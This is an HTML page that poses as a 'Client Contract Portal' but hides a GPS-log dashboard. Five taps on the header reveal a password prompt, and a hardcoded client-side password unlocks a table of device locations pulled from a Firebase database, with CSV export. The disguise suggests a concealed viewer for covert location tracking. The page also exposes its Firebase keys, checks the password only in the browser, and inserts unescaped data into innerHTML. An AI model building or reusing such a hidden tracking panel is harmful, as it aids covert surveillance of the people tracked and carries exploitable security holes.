<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard - GPS Logs</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f9f9f9;
      color: #333;
    }
    .hidden { display: none; }
    .login-screen {
      padding: 30px;
      text-align: center;
    }
    .dashboard {
      padding: 20px;
      animation: fadeIn 1s ease-in;
    }
    .header {
      background: #1a1a1a;
      color: #fff;
      padding: 15px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
    }
    .search-bar input {
      width: 100%;
      padding: 10px;
      margin: 15px 0;
      font-size: 16px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 8px;
      text-align: center;
    }
    th {
      background: #f0f0f0;
    }
    button {
      padding: 8px 12px;
      margin-top: 10px;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="header" id="tap-area">Client Contract Portal</div>

  <div class="login-screen hidden" id="login-screen">
    <p>Scroll to the bottom and enter the password:</p>
    <input type="password" id="password" placeholder="Enter password" />
    <button onclick="unlock()">Access Panel</button>
  </div>

  <div class="dashboard hidden" id="admin-panel">
    <h2>Admin Dashboard</h2>
    <div class="search-bar">
      <input type="text" id="search" placeholder="Search by device or location..." onkeyup="filterTable()" />
    </div>
    <button onclick="exportCSV()">Export as CSV</button>
    <p id="log-count">Daily logs: 0</p>
    <table id="log-table">
      <thead>
        <tr>
          <th>Device</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody id="log-body"></tbody>
    </table>
  </div>

  <script type="module">
    // Firebase config
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const dataRef = ref(db, 'locations');

    onValue(dataRef, (snapshot) => {
      const logs = snapshot.val();
      const tbody = document.getElementById("log-body");
      tbody.innerHTML = '';
      let count = 0;

      if (logs) {
        Object.keys(logs).forEach(device => {
          const entry = logs[device];
          const { lat, lng, timestamp } = entry;
          const date = new Date(timestamp);

          const row = `
            <tr>
              <td>${device}</td>
              <td>${lat || 'N/A'}</td>
              <td>${lng || 'N/A'}</td>
              <td>${isNaN(date) ? 'Invalid' : date.toLocaleString()}</td>
            </tr>
          `;
          tbody.innerHTML += row;
          count++;
        });
      }

      document.getElementById("log-count").innerText = `Daily logs: ${count}`;
    });

    function filterTable() {
      const input = document.getElementById("search").value.toLowerCase();
      const rows = document.querySelectorAll("#log-table tbody tr");
      rows.forEach(row => {
        row.style.display = row.innerText.toLowerCase().includes(input) ? '' : 'none';
      });
    }

    function exportCSV() {
      const rows = document.querySelectorAll("table tr");
      let csv = '';
      rows.forEach(row => {
        const cols = row.querySelectorAll("td, th");
        const line = Array.from(cols).map(cell => `"${cell.innerText}"`).join(",");
        csv += line + "\n";
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "gps_logs.csv";
      a.click();
    }

    // Hidden admin logic
    let tapCount = 0;
    const tapArea = document.getElementById("tap-area");
    tapArea.addEventListener("click", () => {
      tapCount++;
      if (tapCount >= 5) {
        document.getElementById("login-screen").classList.remove("hidden");
        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
      }
    });

    function unlock() {
      const pwd = document.getElementById("password").value;
      if (pwd === "ASCII") {
        document.getElementById("login-screen").classList.add("hidden");
        document.getElementById("admin-panel").classList.remove("hidden");
      } else {
        alert("Wrong password");
      }
    }
  </script>
</body>
  </html>
